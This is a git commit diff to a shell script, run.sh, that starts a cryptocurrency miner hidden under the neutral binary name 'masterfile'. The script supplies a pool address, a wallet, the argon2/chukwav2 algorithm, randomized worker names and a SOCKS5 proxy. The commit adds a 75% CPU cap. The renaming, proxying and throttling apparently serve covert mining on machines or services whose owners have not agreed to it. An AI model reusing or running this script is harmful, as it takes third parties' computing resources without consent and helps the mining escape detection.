34f86fdbd69d5b610d3224d5867b37209f5ee5aa
darestiwaedi <87831139+darestiwaedi@users.noreply.github.com>
2021-08-11 23:40:58 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -8,4 +8,4 @@ POOL=149.248.5.123:6166
 WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
 WORKER=$(echo $(shuf -i 111111-999999 -n 1)-GAS)
 PROXY=socks5://72.221.164.34:60671
-./masterfile -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
+./masterfile -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 --max-cpu-usage 75 -x $PROXY -k
